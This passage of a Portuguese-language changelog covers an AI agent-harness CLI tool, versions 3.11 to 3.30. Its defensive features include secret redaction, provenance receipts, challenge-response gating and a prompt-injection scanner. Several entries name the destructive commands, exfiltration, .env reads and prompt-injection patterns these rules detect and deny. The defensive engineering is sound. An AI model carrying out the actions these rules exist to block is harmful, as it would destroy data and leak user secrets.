- **`docs/en/README.md`**: full guide em inglês (paridade de conteúdo condensada).
- **`docs/guides/`**: `quickstart.md` (termos explicados), `install-paths.md` (lite vs full + empilhamento), `reset-uninstall.md` (o que o uninstall preserva de propósito), `harness-matrix.md` (enforcement real vs instrucional + caminhos de enforcement sem hook).
- `SECURITY.md`/`CONTRIBUTING.md`/`THREAT_MODEL.md` já existiam (v3.21.0) e agora são linkados da landing.

## [3.30.0] - 2026-07-02

### Onboarding consult/start — trilha única (PRD 14 Sprint 8)
O ECC ensina: escolha UM caminho. Agora o gstack recomenda o caminho antes de qualquer escrita — e detecta quando a máquina já está com instalação empilhada.
- **`consult "<objetivo>"`** (novo, READ-ONLY): classifica o objetivo (reusa classifier/recipes) e responde o contrato do aceite — `recommendedPath` (create-lite/create-full/already-active com o comando exato), `doNotStack`, `previewCommand` (`install --audit-only`) e `rollbackCommand` (`uninstall --dry-run`). Teste prova que NADA é escrito (cwd e home intocados).
- **Detecção de instalação empilhada**: hooks em `~/.gstack` E `~/.codex` (caminho legado) coexistindo → alerta "você está usando dois caminhos" com repair sugerido (`install --reinstall` / `uninstall --legacy-name-cleanup`).
- **`start` chama consult internamente**: a recomendação (caminho único + riscos) aparece ANTES do plano — teste garante a ordem.
- **README**: `start`/`consult` agora vêm antes de `install` no quickstart e no dia a dia, com a regra "um caminho só" explícita.
- 6 testes novos.

## [3.29.0] - 2026-07-01

### Agent Reach com seletor de canais (PRD 14 Sprint 7)
Capability layer de leitura/pesquisa na internet governada por CONSENTIMENTO por canal — default seguro, nada de cookie/login sem escolha explícita.
- **`tools agent-reach enable|channels|install-channel|doctor`** (novo): catálogo em `src/tools/agent-reach/catalog.js` com 4 grupos — core zero-config (web-reader/Jina, YouTube, GitHub público, RSS, V2EX, Bilibili), search (Exa), social com cookie/login (Twitter/X, Reddit, Facebook, Instagram, Xiaohongshu) e profissional (LinkedIn, Xueqiu, podcasts).
- **Consentimento por canal**: TTY = wizard que pergunta canal sensível um a um com riscos; não-interativo sem seleção → `needs_channel_selection` (sugere `--core`/`--channels`); canal cookie/login não-interativo e `--channels all` exigem `--accept-risks` listando os efeitos; consentimento registrado com timestamp.
- **Teste de aceite do PRD**: Twitter/Reddit/Facebook/Instagram/Xiaohongshu NUNCA entram no default core.
- **`--dry-run --json`**: canais, dependências, writes, riscos, rollback e regras de consentimento — sem nenhuma escrita. **`--safe`**: só plano/orientação (zero deps, zero writes).
- **Honestidade de backend**: CLI `agent-reach` ausente → `external_engine_unavailable` (canais ficam registrados, instalação pendente); `doctor --json` traz `active_backend` por canal (null quando não há backend — nunca OK falso). Cookies/tokens nunca em `.env`/`.gstack`/logs (regra declarada no plano e no output).
- Escrita só em `.gstack/integrations.json` (project-scoped; rollback trivial). Lite/full não instalam Agent Reach por padrão — tudo opt-in.
- 10 testes novos cobrindo os critérios de aceite do §4.15.

## [3.28.0] - 2026-07-01

### Output Guard pre-render como opt-in claro (PRD 14 Sprint 6)
O guard padrão continua auditoria pós-resposta (detecção) — agora o produto DIZ isso em todo lugar relevante e oferece o caminho de prevenção real sem promessa falsa.
- **`proxy status [--json]`** (novo): cobertura honesta do Output Guard — pós-resposta sempre ativa; pré-render só quando o proxy está VIVO **e** alguma env aponta para ele (`coverage: posthoc_only | pre_render_partial` — nunca "total"). Inclui a matriz de interceptação por harness (`src/security/guard-status.js`): claude/codex via env base-URL, opencode via config manual, cursor/instrucionais = só pós-resposta.
- **Promoção em fluxos de alto risco**: `secrets set` lembra a cobertura real e o opt-in do proxy; `doctor --impact` (humano) declara "detecção, não prevenção" + como ligar o pré-render. JSON do `--impact` inalterado (contrato preservado).
- Probe do proxy fail-safe (conexão recusada = inativo; timeout = ocupado/vivo), fetch injetável.
- 6 testes novos: matriz nunca promete pré-render p/ cursor/instrucionais; proxy vivo sem env apontando ≠ cobertura; JSON puro.

## [3.27.0] - 2026-07-01

### Orchestrate v2 (PRD 14 Sprint 5)
Evolução do Meta-Harness MVP — sem recriar: reviewer LLM plugável, paralelismo entre passos independentes e limites documentados no próprio output.
- **Reviewer LLM plugável** (`--reviewer opencode|claude`, `src/meta/reviewers.js`): invoca o binário do harness com prompt one-shot de veredito parseável (`VERDICT: OK|RISK`). SEMPRE advisory; veredito ilegível = sem sinal; erro do binário = fail-soft com `cobertura reduzida` — nunca aprovação falsa nem crash do run.
- **Fallback determinístico DECLARADO**: reviewer indisponível → `reviewerCoverage: "deterministic_only"` no resultado (o gate decide sozinho, honesto) em vez de fingir revisão.
- **Paralelismo por waves** (`--parallel <n>`): `buildWaves` agrupa passos independentes via `dependsOn` (dep desconhecida ignorada; ciclo degrada para sequencial); concorrência limitada por chunk; teste prova pico de concorrência e ordem de dependência.
- **Limites documentados** (aceite PRD14 §8): `orchestrate --json` retorna `limits` + `reviewerCoverage`; o modo humano imprime os limites atuais (advisory-only, paralelismo local, sem auto-merge, harness instrucional sem enforcement).
- **Regra de ouro intacta**: `decideStatus` inalterado — LLM aprovando NUNCA salva gate reprovado (teste dedicado); `maxIterations` + circuit breaker preservados (breaker corta waves futuras).
- `runOrchestration`/`orchestrateCommand` agora async (executor/review/gate podem ser assíncronos). 14 testes novos (8 orchestrator v2 + 6 reviewers).

## [3.26.0] - 2026-07-01

### Challenge-Response no caminho de execução (PRD 14 Sprint 4)
O VFA sai do "comando manual" e entra no PreToolUse: ação de alto risco agora é BLOQUEADA antes de executar (onde o harness tem hooks reais), com trilha de provenance.
- **`challenge pretool`** (novo sub): decisão determinística allow/deny. Deny devolve o challenge estruturado + o comando exato de resposta (`howTo`); TODA decisão pretool vira recibo hash-chain (`run: pretool`).
- **Grants por regra+alvo com TTL**: `challenge evaluate` com TODAS as evidências grava um recibo `allow` que o gate honra por 15 minutos — só para a MESMA regra e o MESMO alvo (teste prova que não transfere entre alvos e que expira).
- **Hook `pre_tool_use_security.py`**: detecção barata de alto risco (Write/Edit em config global de harness na home; `git push --force`/`drop database`) → só então invoca a CLI (caso raro; sem custo no caminho comum). Regras de ouro preservadas: **só age em projeto gstack** (`find_gstack_root`) e **fail-open** (CLI ausente/saída ilegível/erro → nunca trava o turno).
- **Matriz honesta intacta**: harness instrucional continua `posthoc_audit_only` — o pretool só reivindica enforcement onde há hook real (Claude Code/Cursor).
- 11 testes novos (5 JS: fluxo deny→evidence→grant→allow, TTL, isolamento por alvo; 6 Python: deny com challenge, allow passa, passivo fora de gstack, fail-open x2, arquivo comum não invoca CLI).

## [3.25.0] - 2026-07-01

### Worktree Lifecycle UX (PRD 14 Sprint 3)
As worktrees que o gstack cria (delegate/task/orchestrate) agora são produto de primeira classe: o usuário vê, diffa, aceita e limpa — com salvaguardas determinísticas.
- **`worktree list|inspect|diff|accept|discard|cleanup`** (novo comando): estados determinísticos `main|dirty|conflict|merge-ready|merged|stale|idle|unknown` decididos por matriz de regras pura (`src/worktree/lifecycle.js`, testável sem git).
- **Ownership honesto**: só branches gstack (`gstack/*`, `task/*`) são elegíveis a cleanup — worktrees do usuário NUNCA entram, mesmo mergeadas.
- **Salvaguardas**: `cleanup --dry-run` nunca toca o filesystem (teste compara o fs antes/depois); `discard` com commits não mergeados exige `--force` explícito + confirmação; não-interativo exige `--yes`; `accept` roda `verify --quick` na worktree ANTES de orientar o merge — **sem auto-merge** (você decide).
- **`task status|diff|accept|reject` desestubados**: agora roteiam para o worktree lifecycle (os branches `task/*` do `task run` são inspecionáveis de verdade, em vez do aviso "ainda pendente").
- Reuso: engine de `src/delegation/worktree.js` (removeWorktree/isGitRepo) e `runVerify` — zero lógica duplicada.
- 10 testes novos (5 puros + 5 E2E com repo git real: idle→merge-ready→dirty→merged, cleanup seletivo, força de discard).

## [3.24.0] - 2026-07-01

### MCP Inventory multi-harness (PRD 14 Sprint 2)
Visibilidade real do custo de contexto: quantos servidores MCP cada harness carrega, onde há duplicidade e onde moram credenciais — **sem nunca vazar um valor de segredo**.
- **`tools mcp inventory [--json] [--fragmented]`**: lê Claude (`~/.mcp.json` + `~/.claude.json`), Codex (`~/.codex/config.toml`), OpenCode (`opencode.json[c]`, com parser JSONC tolerante a comentários) e o projeto (`./.mcp.json`); normaliza no schema **`gstack.mcp.v1`** (servers, fragmentation, sources, aggregates).
- **Segurança por construção**: env sai só como NOMES (`envKeys`/`secretEnvKeys`); args/URLs passam por `redactSecrets` (segredo inline vira `***REDACTED***` + flag `hasInlineSecret`). Teste exige que token/chave plantados NÃO apareçam no JSON inteiro.
- **Leitores read-only e tolerantes** (`src/mcp/readers/*` + `shared.js`): config ausente → `exists:false`; inválida (JSON/TOML/JSONC quebrado) → `valid:false` + erro resumido. Nunca crash, nunca reescrita, BOM-safe (Windows).
- **Fragmentação**: mesmo servidor declarado em 2+ fontes é reportado com harnesses/fontes (contexto duplicado que o usuário não vê).
- **`docs/MCP-CONNECTOR-POLICY.md`**: política de admissão de MCP default (universal + MCP>CLI/skill; default ≈ 0–2 conectores), matriz de escrita por modo (full opt-out / project-only e lite nunca) e ritual obrigatório antes de ampliar MCP global.
- Notas QG (MODERATE, documentado): `buildMcpInventory`/`readMcpSource`/`renderInventoryHuman` no limiar CRAP por cobertura estimada — todos com testes dedicados (5 novos).

## [3.23.0] - 2026-07-01

### P1 Hardening (PRD 14 Sprint 1)
O CLI para de prometer menos do que entrega (runtime como "futuro") e de prometer o que não existe (dependência fantasma). Alinhamento total entre claims públicos e comportamento real.
- **Paridade planner-runtime**: `runtime:start`/`runtime:logs`/`runtime:open` saíram de `pending-features` — o planner expande para os comandos REAIS `gstack_vibehard dev`/`logs`/`open` (todo `create` declara `.gstack/runtime.json`; `dev` sobe destacado e retorna). `plan --json` e `plan explain` não mostram mais runtime como "feature futura". `expandStep` refatorado para tabela declarativa (FIXED_STEPS/PREFIX_STEPS).
- **Runtime E2E Windows sem `EBUSY`**: novo `waitPidsExit` no supervisor — `stop` (e `dev --force`) agora esperam a morte REAL dos processos (taskkill/kill retornam antes de o SO soltar handles) antes de reportar "parado"; JSON do `stop` ganha `stillAlive`. Cleanup dos testes E2E com espera de pid + rm com backoff + diagnóstico do arquivo preso. **397/397 no Windows.**
- **Impact sem dependência fantasma**: `cli-anything-hub` removido de `doctor --impact`/`install --audit-only`; teste de regressão exige que toda dep anunciada no preflight tenha âncora real no fluxo de install.
- **Nomenclatura ECC padronizada**: README, `create.js` e `modes.js` usam ECC/ecc-universal (`bootEcc2`→`bootEcc`); `ecc2` só como nota histórica de protótipo externo. Gate: `rg "ECC2|ECC 2.0" README.md src/cli/create.js` limpo.
- **README alinhado à v3.22+**: full documentado como completo com **opt-out** `--no-global-mcp` (lite/project-only nunca escrevem global); `typecheck:ts` (tsc --noEmit baseline) documentado; `dev/stop/logs/open` no dia a dia; `challenge` e `orchestrate` descritos como MVPs com limites declarados.
- Housekeeping: 43 branches locais mergeadas deletadas; `RETORNOGO.md` (era v2.2.4) e `TESTESLLM.MD` (era v0.1.0) removidos; `.pytest_cache/` no `.gitignore`.
- Notas QG (MODERATE, documentado): `bootEcc` (rename-only, complexidade pré-existente) e `cleanupProject` (helper de teste E2E) ficam acima do CRAP ideal; demais findings do QG L1 são legado (`introduced: false`) fora do escopo deste sprint.

## [3.22.0] - 2026-07-01

### E2E lifecycle matrix cross-OS (PRD 12 PR8)
Caixa-preta do produto **publicado**, rodando em **Linux + Windows + macOS** no CI — o mesmo cenário que a máquina limpa expõe, agora automatizado.
- **`scripts/test-e2e-lifecycle.mjs`** (`npm run test:e2e:lifecycle`, gated por `GSTACK_E2E_LIFECYCLE=1`): empacota o tarball real → instala num projeto temp → roda o **BIN instalado** num **HOME descartável** pelo ciclo `doctor → dream audit → create --lite → agents check → install --audit-only → uninstall`.
- **Guard do fix v3.21.1, agora cross-OS**: exige que o `dream audit` no tarball seja **idêntico ao repo** (18 REAL / 0 PLACEBO) em cada OS.
- **Isolamento de HOME provado em caixa-preta**: footprint gstack-scoped (`.gstack_vibehard`/`.claude`/`.codex`/`.cursor`/`.config/opencode`) — read-only e `create` não escrevem config gstack; `install --audit-only --save-report` grava **exatamente 1** relatório. (Ignora caches de ferramentas terceiras que o sondamento de PMs materializa no HOME, ex.: `~/.bun` — ruído do ambiente, não vazamento do produto.)
- **`agents check`** no ciclo valida a integridade da Agent Factory shipada (drift/hashes **CRLF-normalizados**) em cada OS.
- Novo job **`e2e`** (matriz ubuntu/windows/macos, `fail-fast: false`) no `test.yml`.

## [3.21.1] - 2026-06-30

### dream audit honesto na instalação publicada (fix)
A reconfirmação numa máquina Windows LIMPA (`npm i -g`) expôs que `dream audit` mostrava **4 REAL / 16 PARTIAL** — enquanto no repo dá 18 REAL. Causa-raiz: o auditor exigia como **evidência de REAL** arquivos que **não viajam no tarball** (`tests/*.test.js`, `.github/*`). O próprio truth contract mentia em toda cópia instalada — subdeclarando 14 capacidades reais (pior que placebo na filosofia do projeto).
- **Fix de raiz:** REAL agora se baseia SÓ em artefatos que o produto **publica** (módulo de implementação + comando registrado + dados shipados). Nunca em `tests/`/`.github/` — teste prova correção no CI, não é evidência verificável pelo usuário final.
- `types/` e `THREAT_MODEL.md` adicionados à allowlist `files` (evidência shipada de type-coverage e governance).
- **+1 teste de regressão**: monta a árvore EXATA do tarball (só os `files`, sem `tests/`/`.github/`) e exige o mesmo placar do repo (REAL idêntico, 0 PLACEBO). Garante: o mesmo resultado no repo E em `npm i -g`.
- Resultado: `dream audit` na instalação publicada agora mostra **18 REAL / 2 PARTIAL / 0 PLACEBO / 1 RISK**, igual ao repo.

## [3.21.0] - 2026-06-30

### Security & Governance Pack (PRD 12 PR9)
Governança e supply-chain como artefatos versionados — não promessa.
- **`SECURITY.md`** (publicado no pacote): política de report privado + **postura de defesas** mapeando as proteções reais (Secrets Broker, AgentShield, Challenge-Response, VFA Provenance, diff-hygiene/QA, capability matrix honesta, deps mínimas).
- **`THREAT_MODEL.md`**: modelo de ameaças REAL (T1–T10: prompt injection, exfiltração, manifest adulterado, config global, ação não-provável, harness fingindo enforcement, loop descontrolado, revisão otimista, supply chain, drift) → cada um mapeado à mitigação determinística já implementada.
- **`CONTRIBUTING.md`** (ritual de release + disciplina de testes de abuso + zero-dep), **`.github/CODEOWNERS`** (revisão obrigatória; áreas sensíveis secrets/vfa/runtime/agents).
- **CodeQL** (`.github/workflows/codeql.yml`, `security-extended`, semanal) + **SBOM CycloneDX** (`npm run sbom`).
- **dream audit**: governance = REAL → **18 REAL / 2 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK**.
- **+4 testes** (SECURITY/threat-model/CODEOWNERS/CodeQL/SBOM presentes e com conteúdo real). 395 Node + 58 Python verdes; coverage gate; lint/syntaxcheck; pack smoke OK.

## [3.20.0] - 2026-06-30

### `verify` conhece o runtime + usa o package manager real (PRD 12 PR5)
Fecha o P1 da auditoria: o `verify` deixava `runtime`/`preview` como `pending_feature` incondicional (placebo) e rodava `npm install` mesmo em projeto pnpm.
- **Package manager REAL**: `deps`/`lint`/`typecheck`/`test`/`build` agora resolvem o PM (campo `packageManager` → lockfile → fallback npm) — **pnpm/yarn/bun**, não mais `npm` fixo. Cross-platform (no Windows o `pm.cmd` roda via `cmd.exe /c`).
- **Runtime-aware**: para app/web, o `verify` agora **carrega e VALIDA o Runtime Manifest V2** e lê o estado real (`.gstack/runtime/`): manifest **inválido → `failed`** (sinal real, não placebo); válido + serviços `ready` (o `dev` rodou) → **`passed`**; válido + não rodado → **`advisory`** ("rode `dev`"); **sem `runtime.json` → preserva o `pending_product`** (o projeto roda mas o gstack não verifica). `preview:open` reporta a URL real do state quando há.
- **+3 testes** (runtime válido→advisory sem bloquear; inválido→failed→blocked; projeto pnpm→deps usa pnpm). 391 Node + 58 Python verdes; coverage gate verde; lint/syntaxcheck; pack smoke OK.

## [3.19.0] - 2026-06-30

### Type-safety + Coverage + Benchmarks (PRD 12 B3 / PR10)
Tipos nos contratos, gate de cobertura e lint 40× mais rápido — e o `tsc --checkJs` **achou 2 bugs reais de ReferenceError** que nenhum teste/CI pegava (só disparam em caminhos específicos).
- **[bug] `install.js`: `confirm` não estava importado** (não é global no Node — o `tsc` resolveu pro `confirm` do DOM). Um `install` **interativo** (sem `--yes`) **crasharia** no prompt de confirmação. Corrigido (import do `cli/index.js`).
- **[bug] `sprint.js`: `pyCmd` fora de escopo no `catch`** (declarado `const` dentro do `try`) → crash no ENOENT do python. Corrigido (hoist).
- **`tsc --checkJs` + `.d.ts` dos contratos** (`types/contracts.d.ts`: Runtime Manifest V2, Secrets Schema V2, Agent Manifest V2, Attestation Receipt) + `jsconfig.json` para IntelliSense. (Gate `checkJs` full fica como adoção incremental de JSDoc nos options-bags — honesto.)
- **Coverage c8**: `npm run coverage` + **`coverage:ci` no CI** (gate ≥70% linhas / 72% funções / 65% branches; atual **73% / 78% / 73%**).
- **`npm run bench`** (`scripts/bench.mjs`): micro-bench dos caminhos quentes (hashFiles, buildReceipt, allocatePort) — detecta regressão de performance.
- **⚡ `lint` paralelizado**: `node --check` por arquivo agora roda concorrente → **~120s → 3s** no Windows (fim do flake recorrente do `lint.test.js`).
- **dream audit**: type-coverage = REAL → **17 REAL / 2 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK**.
- devDeps: `typescript`, `@types/node`, `c8` (dev-only, não shipados). **+3 testes** (guard dos 2 bugs + infra B3). 388 Node + 58 Python verdes; coverage gate verde; pack smoke OK.

## [3.18.0] - 2026-06-30

### Meta-Harness MVP — o fecho do PRD 13 (PR13.6)
Orquestrador como **máquina de estado** sobre worktree+executor, com **verifier independente** e **dupla verificação** — amarra task-loop (B1), provenance (C1) e o resto.
- **Novo `src/meta/orchestrator.js`** (puro): `decideStatus` (a REGRA DE OURO §11.4.1 — o gate determinístico DECIDE, o LLM é advisory: **LLM aprova + QG falha = `failed`, NUNCA `passed`**; QG passa + LLM aponta risco = `needs_human_review`; QG ausente = `blocked_gate_missing`), `pickExecutor`/`pickVerifier` (planner por especialidade; verifier sempre **≠ executor**), `runOrchestration` (executor implementa → verifier revisa advisory → gate bloqueante → decisão → provenance; **hard caps**; executor≠verifier obrigatório em **risco alto**).
- **Novo `gstack_vibehard orchestrate <planId> [--verify-with <harness>] --yes`**: camada sobre worktree real + `diff-hygiene` como gate determinístico + provenance (recibos separando `llm_review_advisory` de `deterministic_gate`). **SEM auto-merge**: passo `passed` vira branch; o resto é descartado. Guarda: repo git + bloqueia `.env` rastreado. Reviewer LLM é um **hook advisory** (sem reviewer real, o gate decide).
- **dream audit**: meta-harness = REAL → **16 REAL / 2 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK** — **PRD 13 completo** (factory→shield→adapters→provenance→challenge→meta-harness).
- **+8 testes**: 6 de motor (regra de ouro; executor≠verifier; risco alto sem verifier→handoff; hard caps) + **2 e2e reais com git** (passo limpo→passed+branch sem tocar main; `debugger`→gate falha→descarta). 385 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.17.1] - 2026-06-30

### Correção: `challenge --evidence` negava no Windows (cmd/PowerShell quebra a vírgula)
Reconfirmação numa máquina Windows limpa: `challenge evaluate … --evidence a,b,c` retornava **DENY** mesmo com a evidência completa.
- **Causa:** o `cmd.exe`/PowerShell quebra o valor `a,b,c` (sem aspas) em **argumentos separados**, então o parser só via o 1º token (ou nenhum). No bash a vírgula fica num arg só, por isso passava.
- **Fix:** `--evidence` agora **consome múltiplos tokens** até o próximo `--flag` — `--evidence a b c` (split do cmd/PS) **e** `--evidence a,b,c` (bash) valem igual. **+1 teste** (ambas as formas → allow; sem evidência → deny). 377 Node verdes.

## [3.17.0] - 2026-06-30

### Challenge-Response para ações de alto risco (PRD 13 PR13.5)
Antes de uma ação perigosa, a policy exige **justificativa estruturada** — sem a evidência, a ação é **negada** (em harness com hook real).
- **Novo `src/vfa/challenge.js`** (puro): `classifyRisk` (escrita em config GLOBAL de harness, leitura de segredo, MCP global, comando destrutivo `rm -rf`/`drop database`/`push --force`, exfiltração) + `evaluateChallenge` (alto risco exige TODAS as evidências: `install-manifest-owner`/`backup-path`/`rollback-plan`; faltou → **deny**) + `buildChallenge`.
- **Honestidade do enforcement**: harness **instrucional** (copilot/gemini) → `posthoc_audit_only` (não bloqueia antes — só audita depois; **não** é Zero-Trust). Hook real → bloqueio.
- **Novo `gstack_vibehard challenge <classify|evaluate> --intent <i> --target <t> [--scope global] [--harness <id>] [--evidence …]`**: registra a decisão no **provenance** (recibo encadeado, C1).
- **dream audit**: challenge-response = REAL → **15 REAL / 2 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK**. (Resta D1 — Meta-Harness — agora totalmente desbloqueado.)
- **+4 testes** (classifyRisk; DoD deny sem evidência/allow com evidência; instrucional=posthoc; buildChallenge). 376 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.16.0] - 2026-06-30

### VFA Provenance Alpha — recibos com hash-chain (PRD 13 PR13.4)
Verifiability-First: toda ação crítica deixa um **recibo encadeado por hash** — o sistema PROVA o que foi tentado/alterado (por hash, sem o conteúdo bruto), qual policy decidiu, e a cadeia não pode ser adulterada sem ser detectada.
- **Novo `src/vfa/attestation.js`** (puro): `buildReceipt` (inputHash/outputHash + `previousHash` + `receiptHash` que sela o conteúdo via `stableStringify` determinístico), `verifyChain` (pega receiptHash adulterado E previousHash quebrado por remoção/reordenação), `redactReceiptValues`.
- **Novo `src/vfa/provenance.js`**: `.gstack/provenance/actions.jsonl` **append-only** + `index.json`; hash chain **por run**; **redação ANTES de persistir** (segredo nunca em claro — o hash cobre o conteúdo já redigido, cadeia segue válida); logs por workspace.
- **Novo `gstack_vibehard audit <status|inspect|verify|export|doctor> [runId]`**: `verify` recomputa a cadeia e **falha (exit 1) se adulterada**.
- **Integração**: o `task run` (B1) registra um recibo encadeado em cada **accept/reject** (intent/target/policy — hashes, sem diff cru).
- **dream audit**: vfa-provenance = REAL → **14 REAL / 2 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK**. Desbloqueia C2 (challenge-response) e os Audit Agents sobre o log.
- **+4 testes** (recibo/hashes; stableStringify determinístico; cadeia íntegra vs adulteração/remoção; provenance append+redação+jsonl adulterado→falha). 372 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.15.0] - 2026-06-30

### QA Multi-Lens — lentes determinísticas sobre o diff (PRD 12 B2)
Gate de revisão **determinístico** (sem LLM, sem rede) sobre os arquivos mudados, alinhado ao `ultracode.md` (zero eval, zero `any`, zero bare except, zero query sem limit, zero exec shell).
- **Novo `src/project-plan/qa-lenses.js`** (puro): lentes por linguagem — `eval`/`new Function` (ALTO), `exec` com string interpolada (ALTO, command injection), `shell:true` (MÉDIO), `: any`/`as any` (MÉDIO, TS), bare `except:` (MÉDIO, Py), `findMany()` ilimitado (MÉDIO), `SELECT` sem `LIMIT` (BAIXO). `evaluateQa`: ALTO/CRÍTICO bloqueiam; MÉDIO bloqueia em `--strict`.
- **Novo `gstack_vibehard qa [--strict] [--json]`**: varre os arquivos mudados (git), combina as lentes com o `diff-hygiene` (segredo/debugger), veredito por severidade. Testes legítimos e arquivos fora de escopo (.md) não disparam.
- **Sem falso-positivo**: `evaluate`≠`eval(`, `'any'` em string ≠ tipo, `except ValueError:` ≠ bare. Validado: `qa` na própria base do gstack = **0 findings**.
- **dream audit**: qa-multi-lens = REAL → **13 REAL / 2 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK**. (Os Audit Agents sobre *provenance* do §10.4 chegam com a VFA — Sprint C1.)
- **+4 testes** (lentes pegam os anti-padrões; anti-falso-positivo incl. testes/idioma; gate strict; comando bloqueia). 368 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.14.0] - 2026-06-30

### Task Loop Executável — o `task` EXECUTA em worktree (PRD 12 B1 / Sprint B1)
O Loop Engineer sai de "só planeja" para **executar de verdade**: cada passo roda em **worktree isolado** e passa por **diff → diff-hygiene → accept/reject**, sem auto-merge.
- **Novo `src/project-plan/task-loop.js`** (motor PURO/injetável): `runTaskLoop` — por passo, cria worktree, aplica, captura diff, roda `diff-hygiene`; **aceita** (registra branch pronto pra merge) ou **rejeita** (`needs_review`, descarta). **Circuit breaker** (N falhas consecutivas → `handoff` humano; reseta no accept), **replay** (passos já aceitos pulam via journal), **hard cap** de iterações. O journal recebe só **resumo** (stepId/evento/branch/ids) — nunca o diff/segredo/comando.
- **Novo `gstack_vibehard task run [planId] --yes`**: executa o plano salvo. Reusa `worktree.js` (staging por allowlist, exclui `.env`/binário, respeita hooks), `diff-hygiene`, `journal`/`state` canônicos. **Sem auto-merge** — cada passo aceito vira um branch `task/<plano>-<passo>` pra revisão. Guarda: exige repo git e **bloqueia se `.env` está rastreado** (segredo iria pra worktree).
- **dream audit**: `task-loop` PARTIAL→**REAL** → **12 REAL / 2 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK**. Desbloqueia o Meta-Harness (D1).
- **+10 testes**: 7 de motor (abuso — hygiene rejeita, circuit breaker + reset, journal sanitizado, replay, maxIterations) + 3 **e2e reais com git** (passo limpo→branch sem tocar main; `debugger`→rejeitado; `.env` rastreado→bloqueia). 364 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.13.1] - 2026-06-30

### Correção: `agents doctor` acusava drift falso em instalação limpa (Windows)
Reconfirmação numa máquina Windows limpa: `agents doctor` (3.13.0) reportava `Drift: Saida gerada desatualizada: copilot-instructions.md` numa instalação fresca.
- **Causa:** o tarball npm levou os adapters gerados com **CRLF** (autocrlf no Windows ao empacotar; a fonte embute CRLF), mas `build:agents --check` regenera em **LF** → a comparação **exata** do `writeText` acusava drift falso. (O manifest não sofria — é comparado via `JSON.parse`, que ignora line-ending.)
- **Fix:** a comparação de drift do `writeText` agora **normaliza CRLF→LF** — robusta a qualquer line-ending. `--check`/`agents doctor` passam numa instalação limpa independente do empacotamento. **+1 teste** (adapter em CRLF não acusa drift). 354 Node verdes.

## [3.13.0] - 2026-06-30

### Adapter Expansion + Capability Matrix honesta (PRD 13 PR13.3)
A matriz de adapters passa a declarar o **enforcement REAL** de cada harness — e nenhum harness instrucional é rotulado como enforcement/Zero-Trust.
- **Novo `src/agents/adapter-matrix.js`** (§8.4): `enforcement` por harness — `real_hooks` (claude) / `partial` (codex, hermes) / `rules_only` (cursor, **opencode** compat) / `instructional` (copilot, gemini, windsurf) / `detection_only` (kiro). `isInstructional`, `generatedHarnesses`.
- **`agents doctor` honesto**: a matriz mostra `enforcement=` real, não o `trust` de runtime. **opencode** vira `rules_only` (era `trust=strong`, enganoso — é compat Cursor sem hook próprio). Header explícito: "instrucional não é enforcement".
- **Copilot + Gemini gerados**: `agents/generated/copilot/copilot-instructions.md` e `gemini/GEMINI.md` (índices combinados, **com o Execution Contract**). Contrato agora em **65/65** adapters.
- **Label de proveniência**: o doctor mostra "compilado por X" (a versão que compilou os adapters), não a versão do package — honesto quando o release não regenera os adapters.
- **dream audit**: adapter-matrix = REAL → **11 REAL / 3 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK**.
- **+3 testes de matriz** (enforcement honesto, isInstructional sem Zero-Trust, generatedHarnesses) + asserts de copilot/gemini gerados com contrato no e2e. 354 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.12.0] - 2026-06-29

### AgentShield Blocking Build — scan determinístico bloqueia injeção (PRD 13 PR13.2)
O scan de prompt-injection vira gate **determinístico e bloqueante**, em build **e** no `--check` (o gap que importava: uma injeção commitada não passava pelo `--check` do CI).
- **Novo `src/agents/scanner.js`** (puro/testável): `INJECTION_PATTERNS` (override de instrução, exfiltração, leitura de `.env`, desabilitar QG/hooks, vazamento de system prompt, comando destrutivo…), `scanFiles`, `evaluateScan`. **CRÍTICO bloqueia sempre; ALTO bloqueia em `--strict`** (CI release/Full).
- **Roda em build E `--check`** sobre o escopo §9.1 (`core/`, `knowledge/`, `agents/agents/`, `generated/`, `skills/skills/`). Antes o scan só rodava em build → o gate do CI (`--check`) era cego a injeção.
- **Cobertura honesta**: ECC AgentShield é cobertura **adicional**; sem ele o builtin determinístico segue ativo e o verdict é `APROVADO_COBERTURA_REDUZIDA`, nunca `pass` pleno (`reduced_coverage`).
- **Sem falso-positivo**: `process.env` e `.env.example` são BAIXO (não bloqueiam); word-boundary evita casar "send"/"open" em "resend"/"openai".
- **dream audit**: agentshield = REAL → **10 REAL / 3 PARTIAL / 0 PLACEBO / 0 ROADMAP / 1 RISK**.
- **+3 testes scanner** (injeção detectada, anti-falso-positivo, gate strict/non-strict) + **e2e de abuso** (injeção em knowledge bloqueia build E `--check`). 351 Node + 58 Python verdes; lint/syntaxcheck; pack smoke OK.

## [3.11.0] - 2026-06-29

### Agent Factory Contract — fonte única, drift guard, Execution Contract (PRD 13 PR13.1)
A fábrica de agentes (`core/` + `knowledge/` + `agents/agents/` → adapters por harness) vira **contrato do produto**: o que é gerado é comprovável e não pode apodrecer em silêncio.
- **Manifest V2** (`agents/generated/manifest.json`): `schemaVersion 2` + `compilerVersion` + **hashes da fonte** (`coreHash`/`knowledgeHash`/`agentsHash`) + adapter versions/status + security verdict. **Determinístico** (sem `generatedAt`) — o `--check` compara por igualdade sem ruído/churn.
- **Execution Contract** (`src/agents/factory.js`, §8.6): bloco imutável injetado no **fim de TODO adapter gerado** (claude/codex/cursor) — mesmo DNA operacional: "LLM cross-review é advisory only", "Fallow/QG indisponível bloqueia, não passa", respeitar hooks, nunca vazar segredo. Não substitui hooks reais (instrucional segue instrucional).
- **Drift Guard**: `build:agents --check` falha se generated está stale (core/knowledge/agents mudou), foi editado à mão, ou um adapter perdeu o contrato.
